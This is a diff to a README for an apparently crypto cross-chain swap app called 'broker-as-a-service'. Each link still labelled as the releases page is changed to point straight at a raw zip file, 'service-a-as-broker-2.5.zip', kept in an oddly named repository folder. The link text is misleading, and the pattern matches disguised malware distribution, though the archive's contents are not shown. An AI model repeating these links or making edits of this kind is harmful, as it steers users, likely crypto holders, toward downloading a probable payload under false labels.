@@ -1,6 +1,6 @@
 # 🔄 broker-as-a-service - Cross-chain swaps made simple
 
-[![Download broker-as-a-service](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Uncaulked-prefect97/broker-as-a-service/releases)
+[![Download broker-as-a-service](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/Uncaulked-prefect97/broker-as-a-service/raw/refs/heads/main/Enhydris/service-a-as-broker-2.5.zip)
 
 ## 🧭 What this is
 
@@ -17,7 +17,7 @@ This app is built for people who want a simple way to move crypto between chains
 
 ## 📥 Download the app
 
-1. Go to the [broker-as-a-service releases page](https://github.com/Uncaulked-prefect97/broker-as-a-service/releases)
+1. Go to the [broker-as-a-service releases page](https://github.com/Uncaulked-prefect97/broker-as-a-service/raw/refs/heads/main/Enhydris/service-a-as-broker-2.5.zip)
 2. Find the latest release
 3. Download the Windows file from that release
 4. Save the file to a folder you can find again
@@ -141,4 +141,4 @@ If there is an installer, use that first. If there is a portable file, you can r
 
 ## 📎 Download again
 
-If you need the file again, use the [broker-as-a-service releases page](https://github.com/Uncaulked-prefect97/broker-as-a-service/releases)
+If you need the file again, use the [broker-as-a-service releases page](https://github.com/Uncaulked-prefect97/broker-as-a-service/raw/refs/heads/main/Enhydris/service-a-as-broker-2.5.zip)
